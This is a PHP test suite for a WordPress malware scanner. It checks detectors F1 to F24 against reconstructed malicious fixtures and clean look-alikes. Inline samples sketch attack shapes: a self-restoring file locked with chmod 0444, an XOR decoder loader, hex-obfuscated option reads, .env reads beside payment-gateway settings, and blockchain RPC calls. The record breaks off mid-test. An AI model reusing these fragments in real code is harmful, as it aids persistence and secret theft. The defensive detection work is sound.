<?php
/**
 * F1 to F17, one at a time, each against the shape the campaign is documented using and
 * against the clean shape that most resembles it.
 *
 * The fixtures are RECONSTRUCTIONS (tests/fixtures/README.md). What these
 * tests prove is that the regex catches the described shape and lets the
 * described false positive through. Whether the real dropper matches is the
 * corpus test, on the machine that has the backup.
 */

test('F1: a known-bad hash is CRITICAL by name', function () {
    // The list is data, so the test plants a hash for the bytes it has.
    $bytes = "<?php echo 'planted';";
    $sig = new Sky_Sentinel_Signatures(
        array('hashes' => array(hash('sha256', $bytes) => 'test dropper')),
        array(), array()
    );
    $f = (new Sky_Sentinel_Content_Detectors($sig))->scan('wp-content/x.php', $bytes);

    expect(sentinel_ids($f))->toContain('F1')
        ->and($f[0]->severity)->toBe('critical')
        ->and($f[0]->summary)->toContain('test dropper');
});

test('F1: the shipped hash list parses and holds the nine appendix entries', function () {
    $sig = sentinel_signatures();
    expect($sig->known_bad('61fb226317c9c0065c76a0ead1ee72cd2375b0e2c1d16717255b51178d1dcabf'))->toContain('dropper A')
        ->and($sig->known_bad('F830F3861B34969562F2B76A5B26DC8D81699021FBAE7B95ACF5188DC992031D'))->toContain('functions.php')
        ->and($sig->known_bad(str_repeat('0', 64)))->toBeNull();
});

test('F2, F3, F4: the dropper', function () {
    $ids = sentinel_ids(sentinel_scan('bad/dropper-a.php.txt', 'wp-content/cache/elem-1723456789.php'));
    expect($ids)->toContain('F2')->toContain('F3')->toContain('F4');
});

test('F4 wants exactly ONE post key: an ordinary form handler reads two and is clean', function () {
    $ids = sentinel_ids(sentinel_scan('clean/ordinary-plugin.php.txt', 'wp-content/plugins/ordinary/ordinary.php'));
    expect($ids)->not->toContain('F4')->not->toContain('F2')->not->toContain('F3');
});

test('F4: an importer with two post keys, a temp-dir look and an include-by-variable is still not a dropper', function () {
    // The "exactly one key" clause is the one that separates a dropper from
    // an importer. Mutation-tested: relaxing it to "one or more" fires here.
    expect(sentinel_ids(sentinel_scan('clean/importer-two-keys.php.txt', 'wp-content/plugins/importer/import.php')))->not->toContain('F4');
});

test('F2 needs the XOR: a base-36 helper has the alphabet and the explode and is clean', function () {
    expect(sentinel_ids(sentinel_scan('clean/base36-helper.php.txt', 'wp-content/plugins/slugs/base36.php')))->not->toContain('F2');
});

test('F10 needs the numeric array: a minified counter IIFE starting with var n=0 is clean', function () {
    expect(sentinel_ids(sentinel_scan('clean/minified-counter.js.txt', 'wp-content/themes/x/js/cards.min.js')))->not->toContain('F10');
});

test('F5: write-then-include is MEDIUM, and Wordfence is excused by path', function () {
    $flagged = sentinel_scan('clean/wordfence-like.php.txt', 'wp-content/plugins/some-other/boot.php');
    $excused = sentinel_scan('clean/wordfence-like.php.txt', 'wp-content/plugins/wordfence/waf/bootstrap.php');

    $f5 = array_values(array_filter($flagged, fn($f) => 'F5' === $f->detector));
    expect($f5)->toHaveCount(1)
        ->and($f5[0]->severity)->toBe('medium')
        ->and(sentinel_ids($excused))->not->toContain('F5');
});

test('F6: a marker file is only a comment tag', function () {
    $ids = sentinel_ids(sentinel_scan('bad/marker.php.txt', 'wp-content/.marker'));
    expect($ids)->toContain('F6');
    // Not F3: there is no <?php after it.
    expect($ids)->not->toContain('F3');
});

test('F7: the admin-hider by its option names is CRITICAL', function () {
    $f = sentinel_scan('bad/admin-hider.php.txt', 'wp-content/plugins/wp-security-helper/wp-security-helper.php');
    $f7 = array_values(array_filter($f, fn($x) => 'F7' === $x->detector));
    expect($f7)->toHaveCount(1)->and($f7[0]->severity)->toBe('critical');
});

test('F7 and F8: a generic hider by its hooks is HIGH, and a self-hider is F8', function () {
    $f = sentinel_scan('bad/generic-hider.php.txt', 'wp-content/plugins/helper/helper.php');
    $by = array();
    foreach ($f as $x) { $by[$x->detector] = $x->severity; }
    expect($by)->toHaveKey('F7')->toHaveKey('F8')
        ->and($by['F7'])->toBe('high');
});

test('F9 and F10: the loader appended to a real slider file, with its offset', function () {
    $f = sentinel_scan('bad/loader-appended.js.txt', 'wp-content/themes/example/js/home-slider.js');
    $by = array();
    foreach ($f as $x) { $by[$x->detector] = $x; }
    expect($by)->toHaveKey('F9')->toHaveKey('F10')
        ->and($by['F10']->severity)->toBe('critical')
        ->and($by['F9']->severity)->toBe('critical')
        ->and($by['F10']->detail['appended'])->toBeTrue()
        ->and($by['F10']->detail['offset'])->toBeGreaterThan(500)
        ->and($by['F10']->detail['shape'])->toBe('decoder-iife');
});

test('F10 and F11: the whole-file loader by its run-once flag and the IOC it carries', function () {
    $f = sentinel_scan('bad/loader-wholefile.js.txt', 'wp-content/themes/example/js/main.js');
    $by = array();
    foreach ($f as $x) { $by[$x->detector] = $x; }
    expect($by)->toHaveKey('F10')->toHaveKey('F11')
        ->and($by['F10']->detail['appended'])->toBeFalse()
        ->and($by['F11']->detail['iocs'])->toContain('_417b5fd2ce');
});

test('F9 is silent on a vendor file that decodes base64 without executing it', function () {
    expect(sentinel_ids(sentinel_scan('clean/base64-in-vendor.js.txt', 'wp-content/plugins/pdf-viewer/pdf.js')))
        ->not->toContain('F9')->not->toContain('F10');
});

test('F9 and F10 are silent on an ordinary IIFE with a version string', function () {
    expect(sentinel_ids(sentinel_scan('clean/jquery-like.js.txt', 'wp-content/themes/example/js/vendor.js')))->toBe(array());
});

test('F13: PHP echoing the loader from wp_footer is CRITICAL', function () {
    $f = sentinel_scan('bad/functions-inline.php.txt', 'wp-content/themes/twentyseventeen/functions.php');
    $ids = sentinel_ids($f);
    expect($ids)->toContain('F13')->toContain('F10');
});

test('F13 is silent on a theme that echoes an innocent script from wp_footer', function () {
    expect(sentinel_ids(sentinel_scan('clean/theme-functions.php.txt', 'wp-content/themes/mine/functions.php')))->toBe(array());
});

test('F11 and F12: the contract address, the selector and the RPC host', function () {
    $f = sentinel_scan('bad/ioc-contract.js.txt', 'wp-content/plugins/x/loader.js');
    $by = array();
    foreach ($f as $x) { $by[$x->detector] = $x; }
    expect($by)->toHaveKey('F11')->toHaveKey('F12')
        ->and($by['F11']->detail['iocs'])->toContain('b68d1809')->toContain('rpc.ankr.com/polygon');
});

test('F12: an unknown address within 2 KB of an RPC host, with no campaign IOC at all', function () {
    $f = sentinel_scan('bad/address-near-rpc.js.txt', 'wp-content/plugins/x/cfg.js');
    $ids = sentinel_ids($f);
    expect($ids)->toContain('F12')->not->toContain('F11');
});

test('F12: eth_call inside PHP', function () {
    expect(sentinel_ids(sentinel_scan('bad/eth-call.php.txt', 'wp-content/plugins/x/rpc.php')))->toContain('F12');
});

test('F14: a lure with a strong term fires on one', function () {
    $f = sentinel_scan('bad/clickfix-lure.html.txt', 'wp-content/themes/example/lure.html');
    $f14 = array_values(array_filter($f, fn($x) => 'F14' === $x->detector));
    expect($f14)->toHaveCount(1)
        ->and($f14[0]->detail['strong'])->toContain('Win + R');
});

test('F14: a captcha plugin saying "I am not a robot" once is not a lure', function () {
    expect(sentinel_ids(sentinel_scan('clean/captcha-plugin.php.txt', 'wp-content/plugins/captcha/captcha.php')))->toBe(array());
});

test('F15: a service worker not on the allow-list, and one that is', function () {
    expect(sentinel_ids(sentinel_scan('bad/service-worker.js.txt', 'wp-content/themes/example/js/sw-reg.js')))->toContain('F15')
        ->and(sentinel_ids(sentinel_scan('clean/pwa-sw-register.js.txt', 'wp-content/plugins/super-pwa/reg.js')))->not->toContain('F15');
});

test('F16: a plugin that extracts a zip into the plugin directory', function () {
    $f = sentinel_scan('bad/self-heal.php.txt', 'wp-content/plugins/site-helper/site-helper.php');
    expect(sentinel_ids($f))->toContain('F16');
});

test('F17: eval in a theme entry file is MEDIUM, and the same code elsewhere is not F17', function () {
    $in = sentinel_scan('bad/theme-eval.php.txt', 'wp-content/themes/x/functions.php');
    $out = sentinel_scan('bad/theme-eval.php.txt', 'wp-content/themes/x/inc/helpers.php');
    $f17 = array_values(array_filter($in, fn($x) => 'F17' === $x->detector));
    expect($f17)->toHaveCount(1)->and($f17[0]->severity)->toBe('medium')
        ->and(sentinel_ids($out))->not->toContain('F17');
});

test('uploads/ is exempt from the loader-shape detectors but not from the IOC list', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $bytes = sentinel_fixture('bad/loader-wholefile.js.txt');
    $ids = sentinel_ids($d->scan('wp-content/uploads/2026/08/x.js', $bytes));
    expect($ids)->not->toContain('F9')->toContain('F11');
});

test('every clean fixture is silent, or the one it is allowed to be loud about', function () {
    // The floor. A detector that fires on a clean file is a detector nobody
    // will read the output of by the second week.
    $allowed = array(
        'wordfence-like.php.txt'       => array('F5'),
        'big-plugin-activation.php.txt' => array('F16'), // MEDIUM, by design
        'sw-from-variable.js.txt'       => array('F15'), // HIGH under a stranger path; excused only by a known plugin path
        'scanner-that-unzips.php.txt'   => array('F16'), // same: excused only under a known scanner's path
        'self-updater.php.txt'          => array('F18'), // MEDIUM: writes __FILE__ without backdating or locking it
    );
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    foreach (glob(__DIR__ . '/../fixtures/clean/*.txt') as $file) {
        $name = basename($file);
        $as = 'wp-content/plugins/somewhere/' . preg_replace('/\.txt$/', '', $name);
        $ids = sentinel_ids($d->scan($as, (string) file_get_contents($file)));
        $extra = array_diff($ids, $allowed[$name] ?? array());
        expect($extra)->toBe(array(), "{$name} fired " . implode(',', $extra));
    }
});

test('every bad fixture fires at its documented floor', function () {
    // HIGH unless documented otherwise. F17 is MEDIUM by design: some
    // commercial themes eval() and are merely bad. S4 is a file-system check
    // and has its own test.
    $floor = array(
        'theme-eval.php.txt' => 'medium',
        'disguised.jpg.txt'  => null,
    );
    // F17 is about WHICH file, so this one is scanned under an entry name.
    $paths = array(
        'theme-eval.php.txt' => 'wp-content/themes/x/functions.php',
    );
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    foreach (glob(__DIR__ . '/../fixtures/bad/*.txt') as $file) {
        $name = basename($file);
        if (array_key_exists($name, $floor) && null === $floor[$name]) {
            continue;
        }
        $as = $paths[$name] ?? 'wp-content/themes/x/' . preg_replace('/\.txt$/', '', $name);
        $f = $d->scan($as, (string) file_get_contents($file));
        $want = $floor[$name] ?? 'high';
        $loud = array_filter($f, fn($x) => $x->is_at_least($want));
        expect(count($loud))->toBeGreaterThan(0, "{$name} produced nothing at {$want} or above");
    }
});

// ---- From first deployments ---------------------------------------------
// A first scan of a real install is mostly the scanner being too loud, and
// some of it the scanner finding its own source. Each test below pins one
// false positive that a real site produced.

test('F14: a copy-to-clipboard button is one idea, not a lure', function () {
    // Admin UIs and WordPress core's own block editor carry
    // clipboard.writeText + execCommand("copy"). Two terms, one category.
    expect(sentinel_ids(sentinel_scan('clean/copy-button.js.txt', 'wp-content/plugins/acf-extended/assets/js/acfe.js')))->not->toContain('F14');
});

test('F14: still fires on two different ideas without a strong term', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $f = $d->scan('wp-content/themes/x/lure.html', '<p>Verify you are human</p><script>navigator.clipboard.writeText("x")</script>');
    expect(sentinel_ids($f))->toContain('F14');
});

test('F15: a plugin registering its worker from a variable is excused by its path', function () {
    $flagged = sentinel_scan('clean/sw-from-variable.js.txt', 'wp-content/plugins/unknown-thing/push.js');
    $excused = sentinel_scan('clean/sw-from-variable.js.txt', 'wp-content/plugins/wp-mail-smtp-pro/assets/pro/js/smtp-pro-push-notifications.js');
    expect(sentinel_ids($flagged))->toContain('F15')
        ->and(sentinel_ids($excused))->not->toContain('F15');
});

test('F16: activation + upload dir + a write, scattered across a big plugin, is MEDIUM not HIGH', function () {
    // Under a path that is NOT allow-listed: the point is the severity of the
    // weak clause, not the excuse for Gravity Forms.
    $f = sentinel_scan('clean/big-plugin-activation.php.txt', 'wp-content/plugins/some-big-plugin/plugin.php');
    $f16 = array_values(array_filter($f, fn($x) => 'F16' === $x->detector));
    expect($f16)->toHaveCount(1)->and($f16[0]->severity)->toBe('medium');
    // The zip-extract clause is still HIGH: that one is the actual site-helper shape.
    $self = sentinel_scan('bad/self-heal.php.txt', 'wp-content/plugins/site-helper/site-helper.php');
    $f16 = array_values(array_filter($self, fn($x) => 'F16' === $x->detector));
    expect($f16[0]->severity)->toBe('high');
});

test('F16: a scanner that unpacks plugins to compare them is excused by path, and only by path', function () {
    // network.example.test, first scan: NinjaScanner and LearnDash's design wizard.
    $excused = sentinel_scan('clean/scanner-that-unzips.php.txt', 'wp-content/plugins/ninjascanner/lib/scan.php');
    $flagged = sentinel_scan('clean/scanner-that-unzips.php.txt', 'wp-content/plugins/site-helper/site-helper.php');
    expect(sentinel_ids($excused))->not->toContain('F16')
        ->and(sentinel_ids($flagged))->toContain('F16');
});

// ---- The self-healing mu-plugin family (Wordfence, 2026-09) ---------------
// Its hook names, option keys and paths are cipher-encoded. These detectors
// match what the cipher leaves in the clear.

function sentinel_by_detector(array $findings): array {
    $out = array();
    foreach ($findings as $f) { $out[$f->detector] = $f->severity; }
    ksort($out);
    return $out;
}

test('F18: rewriting __FILE__, then backdating and locking it, is CRITICAL', function () {
    $f = sentinel_scan('bad/mu-self-restore.php.txt', 'wp-content/mu-plugins/site-health-reporter.php');
    $f18 = array_values(array_filter($f, fn($x) => $x->detector === 'F18'))[0];
    expect($f18->severity)->toBe('critical')->and($f18->detail)->toBe(array('backdates' => true, 'locks' => true))
        ->and($f18->summary)->toContain('backdates')->toContain('0444');
});

test('F18: a self-updater that writes __FILE__ and nothing more is MEDIUM', function () {
    expect(sentinel_by_detector(sentinel_scan('clean/self-updater.php.txt', 'wp-content/plugins/tool/tool.php')))->toBe(array('F18' => 'medium'));
});

test('F18: rename() onto __FILE__ counts as a write; touching some other file does not count as a backdate', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $rename = "<?php\n\$tmp = tempnam(sys_get_temp_dir(), 'sc_');\nif (!@rename(\$tmp, __FILE__)) { @copy(\$tmp, __FILE__); }\n@chmod(__FILE__, 0444);";
    expect(sentinel_by_detector($d->scan('wp-content/db.php', $rename)))->toBe(array('F18' => 'critical'));
    $other = "<?php\nfile_put_contents(__FILE__, \$x);\ntouch(\$log, time());";
    expect(sentinel_by_detector($d->scan('wp-content/plugins/x/x.php', $other)))->toBe(array('F18' => 'medium'));
});

test('F19: the substitution cipher, and a plain character-lookup loop is not one', function () {
    expect(sentinel_by_detector(sentinel_scan('bad/string-cipher.php.txt', 'wp-content/advanced-cache.php')))->toBe(array('F19' => 'high'));
    // backup-plugin has strpos($vowels, $word[$i]) but no fragmented alphabet.
    expect(sentinel_ids(sentinel_scan('clean/backup-plugin.php.txt', 'wp-content/plugins/backup/backup.php')))->not->toContain('F19');
});

test('F20: hex escapes that decode to SQL are HIGH and name what they decode to', function () {
    $f = array_values(array_filter(sentinel_scan('bad/hex-sql.php.txt', 'wp-content/db.php'), fn($x) => $x->detector === 'F20'));
    expect($f)->toHaveCount(1)->and($f[0]->severity)->toBe('high');
    $decoded = implode(' | ', $f[0]->detail['decoded']);
    expect($decoded)->toContain('UPDATE {$table}')->toContain('SELECT option_value')->toContain('START TRANSACTION');
});

test('F20: byte-order marks, magic numbers and control characters decode to nothing and stay quiet', function () {
    expect(sentinel_ids(sentinel_scan('clean/binary-escapes.php.txt', 'wp-content/plugins/files/files.php')))->toBe(array());
});

test('F20: function names match in any case, because PHP calls them in any case', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $f = $d->scan('wp-content/db.php', "<?php\n\$fn = \"\\x47ET_\\x4fPTION\";\n\$fn('bu');");
    expect(sentinel_by_detector($f))->toBe(array('F20' => 'high'));
});

test('F20 only reads PHP: the same escapes in a .js file are not its business', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    expect(sentinel_ids($d->scan('wp-content/themes/x/app.js', sentinel_fixture('bad/hex-sql.php.txt'))))->not->toContain('F20');
});

test('F21: three or more server roots plus mu-plugins is a spreader; a backup tool with two roots is not', function () {
    $f = array_values(array_filter(sentinel_scan('bad/spreader.php.txt', 'wp-content/mu-plugins/x.php'), fn($x) => $x->detector === 'F21'));
    expect($f)->toHaveCount(1)->and($f[0]->severity)->toBe('high')->and(count($f[0]->detail['roots']))->toBeGreaterThanOrEqual(3);
    expect(sentinel_ids(sentinel_scan('clean/backup-plugin.php.txt', 'wp-content/plugins/backup/backup.php')))->not->toContain('F21');
});

test('F22: gateway names plus wp-config.php plus .env / .git/config is CRITICAL', function () {
    $f = array_values(array_filter(sentinel_scan('bad/key-harvest.php.txt', 'wp-content/mu-plugins/x.php'), fn($x) => $x->detector === 'F22'));
    expect($f)->toHaveCount(1)->and($f[0]->severity)->toBe('critical')->and($f[0]->detail)->toBe(array('config' => true, 'secrets' => true));
});

test('F22: a Stripe gateway plugin names its settings and reads nothing else; a backup tool reads wp-config.php and names no gateway', function () {
    expect(sentinel_ids(sentinel_scan('clean/stripe-gateway.php.txt', 'wp-content/plugins/stripe/stripe.php')))->toBe(array())
        ->and(sentinel_ids(sentinel_scan('clean/backup-plugin.php.txt', 'wp-content/plugins/backup/backup.php')))->toBe(array());
});

test('F22: gateway names with only one of the two reads is HIGH', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $only_env = "<?php\n\$t = file_get_contents(ABSPATH . '.env');\n\$s = get_option('woocommerce_stripe_settings');";
    expect(sentinel_by_detector($d->scan('wp-content/plugins/x/x.php', $only_env)))->toBe(array('F22' => 'high'));
});

test('F23: writing active_plugins with raw SQL, and a restore that rewrites siteurl is not it', function () {
    expect(sentinel_by_detector(sentinel_scan('bad/reactivate-sql.php.txt', 'wp-content/plugins/x/x.php')))->toBe(array('F23' => 'high'))
        ->and(sentinel_ids(sentinel_scan('clean/backup-plugin.php.txt', 'wp-content/plugins/backup/backup.php')))->not->toContain('F23');
});

test('F11: the Wordfence sample\'s selector and throttle names are campaign indicators', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $f = $d->scan('wp-content/plugins/x/x.js', '{"jsonrpc":"2.0","id":3,"method":"eth_call","params":[{"data":"0x3bc5de30"}]}');
    expect(sentinel_by_detector($f))->toHaveKey('F11')->and(sentinel_by_detector($f)['F11'])->toBe('critical');
    $g = $d->scan('wp-content/plugins/x/x.php', "<?php if (get_transient('sc_recover_check')) return;");
    expect(sentinel_ids($g))->toContain('F11');
});

test('F12: an address near an Ethereum mainnet gateway the old pattern missed', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $js = "var c='0x" . str_repeat('ab', 20) . "'; fetch('https://cloudflare-eth.com', {method:'POST'});";
    expect(sentinel_ids($d->scan('wp-content/themes/x/app.js', $js)))->toContain('F12');
    $merkle = "var c='0x" . str_repeat('cd', 20) . "'; fetch('https://eth.merkle.io', {method:'POST'});";
    expect(sentinel_ids($d->scan('wp-content/themes/x/app.js', $merkle)))->toContain('F12');
});

test('F21: a diagnostics page listing five server roots but never mu-plugins is not a spreader', function () {
    expect(sentinel_ids(sentinel_scan('clean/server-info.php.txt', 'wp-content/plugins/server-info/info.php')))->toBe(array());
});

// ---- From a scan of a real compromised install, 2026-09-24 --------------

test('F23: prose about active_plugins and update_option() are not raw SQL', function () {
    // Case-insensitive, F23 fired 16 times on a real install: every Akismet copy,
    // Freemius, Gravity Perks and a custom SEOPress updater.
    expect(sentinel_ids(sentinel_scan('clean/plugin-load-order.php.txt', 'wp-content/plugins/akismet/class.akismet.php')))->not->toContain('F23');
    // ...and the SQL shape still fires.
    expect(sentinel_ids(sentinel_scan('bad/reactivate-sql.php.txt', 'wp-content/plugins/x/x.php')))->toContain('F23');
});

/** A loader with the real build's proportions: a ~7.8 KB numeric array, the XOR ~8 KB in. */
function sentinel_long_loader(): string {
    $nums = implode(',', array_map(fn($i) => ($i * 37) % 101, range(1, 2700)));
    return "(function(){ var x418c5a=4309; if(x418c5a>0){var y=x418c5a-4910}else{var y=4910} var z=y*18; var _0x3d75fd8731c6=[{$nums}]; var o=''; for(var i=0;i<_0x3d75fd8731c6.length;i++){o+=String.fromCharCode(_0x3d75fd8731c6[i]^(z&255));} })();";
}

test('F10: a loader whose array outruns 4 KB is still the loader, whole-file and appended', function () {
    // A real-install scan found F10 silent on both loader builds: its array closes
    // ~7.9 KB in and the XOR is ~8.1 KB in, past a 4 KB window.
    $loader = sentinel_long_loader();
    expect(strlen($loader))->toBeGreaterThan(7000)->and(strpos($loader, '^'))->toBeGreaterThan(4096);
    $whole = Sky_Sentinel_Content_Detectors::loader_structure($loader);
    expect($whole['shape'])->toBe('decoder-iife')->and($whole['appended'])->toBeFalse();
    $appended = Sky_Sentinel_Content_Detectors::loader_structure(str_repeat("jQuery('.slide').fadeIn(200);\n", 75) . $loader);
    expect($appended['appended'])->toBeTrue()->and($appended['offset'])->toBeGreaterThan(2000);
});

test('F10: the array must start near the opening, and an IIFE with no XOR in reach is not the loader', function () {
    $nums = implode(',', range(1, 40));
    // A numeric table 2 KB into an ordinary IIFE.
    $late = "(function(){ var n=0; " . str_repeat('n++; ', 450) . "var t=[{$nums}]; return t[n^1]; })();";
    expect(Sky_Sentinel_Content_Detectors::loader_structure($late))->toBeNull();
    // Array in reach, XOR 20 KB away.
    $far = "(function(){ var n=0; var t=[{$nums}]; " . str_repeat('n++; ', 4200) . " return t[n^1]; })();";
    expect(Sky_Sentinel_Content_Detectors::loader_structure($far))->toBeNull();
});

// ---- 0.4.7, from a second real compromised install ----------------------

test('F4 reads the key from $_REQUEST through a variable: the dropper with a new alphabet and no prelude is still HIGH', function () {
    $f = sentinel_scan('bad/dropper-request-var.php.txt', 'wp-content/exports/report-data.php');
    $f4 = array_values(array_filter($f, fn($x) => 'F4' === $x->detector));
    // Before 0.4.7 this file was F5 alone: MEDIUM, the next morning's digest.
    expect(sentinel_ids($f))->not->toContain('F2')->not->toContain('F3')
        ->and($f4)->toHaveCount(1)
        ->and($f4[0]->severity)->toBe('high')
        ->and($f4[0]->detail['request_key'])->toBe('$_REQUEST[$value]');
});

test('F4 does not count $_GET: a page cache reading one ?page= beside a temp dir and an include is clean', function () {
    expect(sentinel_ids(sentinel_scan('clean/one-get-key-cache.php.txt', 'wp-content/plugins/cache/list.php')))->not->toContain('F4');
});

test('F24: PHP that includes a picture is HIGH; including templates and printing an img tag is not', function () {
    $f = sentinel_scan('bad/image-include.php.txt', 'wp-content/logs/newsletter/logo.php');
    expect(sentinel_ids($f))->toBe(array('F24'))
        ->and($f[0]->severity)->toBe('high')
        ->and($f[0]->detail['included'])->toBe('/home/example/bin/start.gif');
    expect(sentinel_ids(sentinel_scan('clean/template-include.php.txt', 'wp-content/themes/x/header.php')))->not->toContain('F24');
});

test('F11 knows the Base-chain runtime by its contract ABI and by its blob prefix, each alone', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    expect(sentinel_ids($d->scan('wp-content/plugins/p/a.js', "var c=new ethers.Contract(t,['function getDemoPage() view returns (string,string)'],p);")))->toContain('F11')
        ->and(sentinel_ids($d->scan('wp-content/plugins/p/a.js', "if(x.slice(0,8)==='nc-blob:')go();")))->toContain('F11');
});

test('F11 is quiet on the cleanup tools that name the runtime to remove it', function () {
    // On a real multisite, 2026-09: a page-level kill switch in two sites'
    // theme header scripts, and an uploads scanner's backdoor regex, both
    // list hasDemoPage as a bare word. The indicator is hasDemoPage(.
    // hour, through the page check). The runtime always calls getDemoPage
    // beside it, so hasDemoPage is not an indicator.
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    expect(sentinel_ids($d->scan('page/site-2:home.html', sentinel_fixture('clean/page-kill-switch.html.txt'))))->not->toContain('F11')
        ->and(sentinel_ids($d->scan('wp-content/mu-plugins/upload-scanner.php', "<?php \$bad = '/eval\\s*\\(|getActiveScripts|hasDemoPage|nochain|58460d0b3d4d6b03761c89120393c0c676676496/i';")))->not->toContain('F11');
});

test('F11 does not fire on the service-worker kill switch that clears nc-eth and ncblob', function () {
    // A cleanup's own kill-switch worker names the attacker's caches to
    // clear them. Those names must not be indicators.
    $js = "const bad=/^nc[:_-]|^__nc|nochain/i; // caches named nc-eth and ncblob\nself.registration.unregister();";
    expect(sentinel_ids((new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan('nochain-sw.js', $js)))->not->toContain('F11');
});

/** A megabyte-plus of bundle that has none of the loader's parts. */
function sentinel_big_bundle(int $bytes = 1_300_000): string {
    $line = "function f(a,b){return a.map(function(c){return c+b})};\n";
    return str_repeat($line, intdiv($bytes, strlen($line)) + 1);
}

test('a file over MAX_BYTES is read whole: a loader appended to 1.3 MB is CRITICAL at its real offset', function () {
    $loader = sentinel_fixture('bad/loader-wholefile.js.txt');
    $bundle = sentinel_big_bundle();
    $bytes  = $bundle . $loader;
    $f = (new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan_any('wp-content/themes/example/js/fontawesome-all.min.js', $bytes);
    $f10 = array_values(array_filter($f, fn($x) => 'F10' === $x->detector));
    expect($f10)->toHaveCount(1)
        ->and($f10[0]->severity)->toBe('critical')
        ->and($f10[0]->detail['appended'])->toBeTrue()
        ->and($f10[0]->detail['offset'])->toBe(strlen($bundle) + Sky_Sentinel_Content_Detectors::loader_structure($loader)['offset'])
        // The whole file's hash, so F1 and the fingerprint follow the file.
        ->and($f10[0]->sha256)->toBe(hash('sha256', $bytes));
});

test('a big file is read at the start too, and a detector firing in more than one piece is reported once', function () {
    $loader = sentinel_fixture('bad/loader-wholefile.js.txt');
    $f = (new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan_any('wp-content/plugins/x/big.js', $loader . sentinel_big_bundle() . $loader);
    expect(array_count_values(array_map(fn($x) => $x->detector, $f))['F10'])->toBe(1);
    $f = (new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan_any('wp-content/plugins/x/big.js', $loader . sentinel_big_bundle(2_500_000));
    expect(sentinel_ids($f))->toContain('F10');
});

test('F1 matches a big file by its whole hash', function () {
    $bytes = sentinel_big_bundle();
    $sig = new Sky_Sentinel_Signatures(array('hashes' => array(hash('sha256', $bytes) => 'big infected bundle')), array(), array());
    $f = (new Sky_Sentinel_Content_Detectors($sig))->scan_any('wp-content/x.js', $bytes);
    expect(sentinel_ids($f))->toBe(array('F1'));
});

test('F9 needs its three calls close together: a big bundle holding them 800 KB apart is clean', function () {
    // MailPoet's newsletter_editor.js, 1.4 MB.
    $pad = str_repeat("x=1;\n", 80_000);
    $far = 'var a=atob(s);' . $pad . 'String.fromCharCode(1);' . $pad . 'var g=new Function("return this")();' . $pad;
    $near = $pad . $pad . $pad . 'var a=atob(s),c=String.fromCharCode(1);(new Function(c))();';
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    expect(strlen($far))->toBeGreaterThan(Sky_Sentinel_Content_Detectors::MAX_BYTES)
        ->and(sentinel_ids($d->scan_any('wp-content/plugins/mailpoet/editor.js', $far)))->not->toContain('F9')
        ->and(sentinel_ids($d->scan_any('wp-content/plugins/mailpoet/editor.js', $near)))->toContain('F9');
});

test('F9 needs them close in a small file too: dropzone 5.9.3, as Formidable Pro ships it, is clean', function () {
    // dropzone.min.js, 115 KB: fromCharCode at ~29 KB (punycode), new
    // Function("return this") at ~66 KB (core-js), atob at ~109 KB
    // (dataURItoBlob). HIGH until 0.4.8.
    $pad = fn(int $n) => str_repeat('a.b=c;', intdiv($n, 6));
    $dropzone = $pad(29_000) . 'a=String.fromCharCode,' . $pad(36_000) . 'try{return this||new Function("return this")()}catch(e){}' . $pad(43_000) . 'var t=atob(e.split(",")[1]);' . $pad(5_000);
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    expect(strlen($dropzone))->toBeLessThan(Sky_Sentinel_Content_Detectors::MAX_BYTES)
        ->and(sentinel_ids($d->scan('wp-content/plugins/formidable-pro/js/dropzone.min.js', $dropzone)))->not->toContain('F9')
        // The same three calls within the loader's span still fire, at the edge of it.
        ->and(sentinel_ids($d->scan('wp-content/plugins/x/a.js', 'atob(a);' . str_repeat(' ', Sky_Sentinel_Content_Detectors::F9_SPAN - 20) . 'new Function(b);fromCharCode(1)')))->toContain('F9')
        ->and(sentinel_ids($d->scan('wp-content/plugins/x/a.js', 'atob(a);' . str_repeat(' ', Sky_Sentinel_Content_Detectors::F9_SPAN + 20) . 'new Function(b);fromCharCode(1)')))->not->toContain('F9');
});

test('a loader in the MIDDLE of a big file is found, and so is one that crosses a piece boundary', function () {
    // 0.4.7 read only the first and last MB; a File Manager edit can put
    // the loader anywhere.
    $loader = sentinel_fixture('bad/loader-wholefile.js.txt');
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $middle = sentinel_big_bundle(1_500_000) . $loader . sentinel_big_bundle(1_500_000);
    $f10 = array_values(array_filter($d->scan_any('wp-content/plugins/x/big.js', $middle), fn($x) => 'F10' === $x->detector));
    expect($f10)->toHaveCount(1)
        ->and($f10[0]->detail['offset'])->toBe(strlen(sentinel_big_bundle(1_500_000)) + Sky_Sentinel_Content_Detectors::loader_structure($loader)['offset']);
    // A loader of the real length (~8 KB) starting 3 KB before the end of
    // the first piece: cut in two there, whole in the second piece, which
    // begins CHUNK_OVERLAP earlier. With no overlap neither piece holds it.
    $long = sentinel_long_loader();
    $pad = str_repeat(' ', Sky_Sentinel_Content_Detectors::MAX_BYTES - 3000);
    $straddle = $pad . $long . sentinel_big_bundle(1_500_000);
    expect(strlen($long))->toBeGreaterThan(6000);
    expect(sentinel_ids($d->scan_any('wp-content/plugins/x/big.js', $straddle)))->toContain('F10');
});

test('F11 does not fire on the page cleanup that clears hasDemoPage from localStorage', function () {
    // An inline cleanup script on a real home page (2026-09) removes the
    // campaign's service workers, caches and localStorage entries. Its
    // value regex names hasDemoPage and nc-blob; neither is a call.
